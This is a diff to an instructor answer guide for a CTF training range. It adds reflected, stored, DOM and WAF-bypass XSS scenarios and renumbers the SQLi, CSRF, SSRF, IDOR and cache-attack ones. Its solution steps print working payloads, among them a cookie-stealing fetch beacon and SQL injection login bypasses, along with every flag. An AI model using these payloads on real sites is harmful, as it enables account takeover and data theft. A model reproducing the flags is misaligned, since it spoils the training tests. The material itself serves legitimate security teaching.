@@ -2,7 +2,7 @@
 
 **Confidential — Instructor & Administrator Reference Only**
 
-This guide documents the full 16-port modular architecture for the CSZone CTF Range. Each scenario is isolated on its own dedicated port for clean VPS deployment and professional training execution.
+This guide documents the full 21-port modular architecture for the CSZone CTF Range. Each scenario is isolated on its own dedicated port for clean VPS deployment and professional training execution.
 
 ---
 
@@ -22,12 +22,16 @@ This guide documents the full 16-port modular architecture for the CSZone CTF Ra
 | **8009** | Scenario 09: Products SQLi | SQL Injection | E-Commerce Filter Boolean Bypass & UNION SQLi | `CTF{un10n_b4s1cs_m4st3r}` |
 | **8010** | Scenario 10: Personnel SQLi | SQL Injection | 3-Column UNION-based Database Extraction | `CTF{un10n_s3l3ct_m4st3r}` |
 | **8011** | Scenario 11: Asset Inventory SQLi | SQL Injection | Double Quotes, '#' Comments & Schema Enumeration | `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}` |
-| **8012** | Scenario 12: SQLi & XSS | SQLi + Stored XSS | Legacy Admin SQLi Bypass & Stored Cookie Theft | `CTF{st0r3d_c00k13_th3ft}` |
-| **8013** | Scenario 13: CSRF Account | CSRF | Cross-Site Request Forgery State Change | `CTF{csrf_n0_t0k3n_pwn3d}` |
-| **8014** | Scenario 14: File Upload | Upload / Stored XSS | Blocklist Bypass & Direct Script Execution | Verified HTML/JS Execution |
-| **8015** | Scenario 15: SSRF Metadata | SSRF | Internal Loopback Cloud Metadata Retrieval | `CTF{ssrf_1nt3rn4l_m3t4d4t4}` |
-| **8016** | Scenario 16: Backend IDOR | Web / IDOR | Order Object Reference & Audit Note Leak | `CTF{b4ck3nd_1d0r_r34l}` |
-| **8017** | Scenario 17: Cache Attacks | Web Cache Attacks | Web Cache Deception & Host Cache Poisoning | `CTF{c4ch3_d3c3pt10n_l34k}` |
+| **8012** | Scenario 12: Reflected XSS | Cross-Site Scripting | Raw HTML Parameter Reflection & Token Leak | `CTF{r3fl3ct3d_xss_b4s1cs}` |
+| **8013** | Scenario 13: Stored Attribute XSS | Cross-Site Scripting | Naive Filter Bypass & Attribute Event Breakout | `CTF{st0r3d_4ttr1but3_br34k0ut}` |
+| **8014** | Scenario 14: DOM-based XSS | Cross-Site Scripting | Client-Side URL Routing to innerHTML Sink | `CTF{d0m_xss_s1nk_m4st3r}` |
+| **8015** | Scenario 15: WAF Bypass XSS | Cross-Site Scripting | HTML5 SVG Animation & Details Toggle Vectors | `CTF{w4f_byp4ss_h5_v3ct0r}` |
+| **8016** | Scenario 16: SQLi & Stored XSS | Chained Exploit | Legacy Admin SQLi Bypass & Stored Cookie Theft | `CTF{st0r3d_c00k13_th3ft}` |
+| **8017** | Scenario 17: CSRF Account | CSRF | Cross-Site Request Forgery State Change | `CTF{csrf_n0_t0k3n_pwn3d}` |
+| **8018** | Scenario 18: File Upload | Upload / Stored XSS | Blocklist Bypass & Direct Script Execution | Verified HTML/JS Execution |
+| **8019** | Scenario 19: SSRF Metadata | SSRF | Internal Loopback Cloud Metadata Retrieval | `CTF{ssrf_1nt3rn4l_m3t4d4t4}` |
+| **8020** | Scenario 20: Backend IDOR | Web / IDOR | Order Object Reference & Audit Note Leak | `CTF{b4ck3nd_1d0r_r34l}` |
+| **8021** | Scenario 21: Cache Attacks | Web Cache Attacks | Web Cache Deception & Host Cache Poisoning | `CTF{c4ch3_d3c3pt10n_l34k}` |
 
 ---
 
@@ -87,7 +91,7 @@ This guide documents the full 16-port modular architecture for the CSZone CTF Ra
 - **URL:** `http://<host>:8008/finale/index.html`
 - **Steps:**
   1. Send request with `Cookie: access_level=admin-9f3a` and `?key=Summer2024!`.
-  2. Server returns/decrypts ciphertext `ECErFgNDXARea0I7QVwDOhECXUJYEidGEA==` using key `Summer2024!` to `CTF{ch41n_c0mpl3t3_m4st3r}`.
+  2. Server returns/decrypts ciphertext `ECErFgNDXARea0I7QVwDOhECXUJYEidGEA==` using key `Summer2024!` to `CTF{f1n4l_ch41n_c0mpl3t3}`.
 
 ### Scenario 09 (Port 8009) — Products SQL Injection
 - **URL:** `http://<host>:8009/products`
@@ -121,40 +125,71 @@ This guide documents the full 16-port modular architecture for the CSZone CTF Ra
      - `" UNION SELECT record_name, flag_data, access_pin, vault_level FROM classified_vault_records #`
      - Captures flag: `CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}`.
 
-### Scenario 12 (Port 8012) — Legacy Admin SQLi + Stored XSS Chain
-- **URL:** `http://<host>:8012/`
+### Scenario 12 (Port 8012) — Reflected XSS into HTML Context
+- **URL:** `http://<host>:8012/search?q=`
+- **Steps:**
+  1. Intercept search request in Burp Suite.
+  2. Inject `<script>document.getElementById('vault-display').innerText=document.getElementById('user_token').value;</script>`.
+  3. Flag: `CTF{r3fl3ct3d_xss_b4s1cs}`.
+
+### Scenario 13 (Port 8013) — Stored XSS in Attribute Context
+- **URL:** `http://<host>:8013/feedback`
+- **Steps:**
+  1. Notice `<script>` tags are filtered.
+  2. Submit attribute breakout payload in Author field:
+     `" onfocus="document.getElementById('reward-panel').innerText=document.getElementById('secret-vault-key').value" autofocus="`
+  3. Reload page -> autofocus triggers execution -> Flag: `CTF{st0r3d_4ttr1but3_br34k0ut}`.
+
+### Scenario 14 (Port 8014) — DOM-based XSS (Source to Sink)
+- **URL:** `http://<host>:8014/analytics`
+- **Steps:**
+  1. Inspect `analytics.html` source to identify Source (`location.search`) and Sink (`innerHTML`).
+  2. Craft payload in URL parameter `tab`:
+     `/analytics?tab=<img src=1 onerror="document.getElementById('extracted-vault').innerText=window.__TELEMETRY_KEY">`
+  3. Flag: `CTF{d0m_xss_s1nk_m4st3r}`.
+
+### Scenario 15 (Port 8015) — Advanced WAF & Filter Bypass XSS
+- **URL:** `http://<host>:8015/preview`
+- **Steps:**
+  1. Test input against WAF rules (`<script>`, `onerror=`, `onload=`, `"` are blocked).
+  2. Craft HTML5 SVG animation bypass vector without quotes:
+     `<svg><animate onbegin=document.getElementById('rule-flag').innerText=document.getElementById('waf-secret').value attributeName=x>`
+  3. Flag: `CTF{w4f_byp4ss_h5_v3ct0r}`.
+
+### Scenario 16 (Port 8016) — Legacy Admin SQLi + Stored XSS Chain
+- **URL:** `http://<host>:8016/`
 - **Steps:**
   1. Post XSS payload to `/guestbook`: `<img src=x onerror="fetch('/xss/collect?c='+encodeURIComponent(document.cookie))">`.
   2. Bypass login at `/legacy-admin/login` using `admin' OR '1'='1' -- -` (sets cookie `admin_session_flag=CTF{st0r3d_c00k13_th3ft}`).
   3. Visit `/admin/inbox` -> triggers beacon -> inspect `/xss/collect/log` to capture `CTF{st0r3d_c00k13_th3ft}`.
 
-### Scenario 13 (Port 8013) — CSRF Account Email
-- **URL:** `http://<host>:8013/`
+### Scenario 17 (Port 8017) — CSRF Account Email
+- **URL:** `http://<host>:8017/`
 - **Steps:**
   1. Log in to account.
   2. Fire unauthenticated cross-site POST to `/account/email` with `email=pwned@attacker-controlled.test`.
   3. Flag: `CTF{csrf_n0_t0k3n_pwn3d}`.
 
-### Scenario 14 (Port 8014) — Unrestricted File Upload
-- **URL:** `http://<host>:8014/upload`
+### Scenario 18 (Port 8018) — Unrestricted File Upload
+- **URL:** `http://<host>:8018/upload`
 - **Steps:**
   1. Upload `pwn.html` containing `<script>...</script>`.
   2. Fetch `/static/uploads/pwn.html` to confirm execution.
 
-### Scenario 15 (Port 8015) — Server-Side Request Forgery (SSRF)
-- **URL:** `http://<host>:8015/avatar-import`
+### Scenario 19 (Port 8019) — Server-Side Request Forgery (SSRF)
+- **URL:** `http://<host>:8019/avatar-import`
 - **Steps:**
-  1. Post `url=http://127.0.0.1:8015/internal/metadata`.
+  1. Post `url=http://127.0.0.1:8019/internal/metadata`.
   2. Server returns JSON metadata containing `CTF{ssrf_1nt3rn4l_m3t4d4t4}`.
 
-### Scenario 16 (Port 8016) — Backend IDOR Orders
-- **URL:** `http://<host>:8016/orders`
+### Scenario 20 (Port 8020) — Backend IDOR Orders
+- **URL:** `http://<host>:8020/orders`
 - **Steps:**
   1. Access `/orders/2` directly without authorization.
   2. Order notes contain `CTF{b4ck3nd_1d0r_r34l}`.
 
-### Scenario 17 (Port 8017) — Web Cache Attacks
-- **URL:** `http://<host>:8017/`
+### Scenario 21 (Port 8021) — Web Cache Attacks
+- **URL:** `http://<host>:8021/`
 - **Steps:**
   1. **Cache Deception:** Log in as victim, request `/account/profile/legacy-theme.css`. Issue unauthenticated GET to the same path -> cache HIT returns `CTF{c4ch3_d3c3pt10n_l34k}`.
   2. **Cache Poisoning:** GET `/promo/partner-banner` with `X-Forwarded-Host: evil-attacker-domain.test` -> primes cache for all visitors.
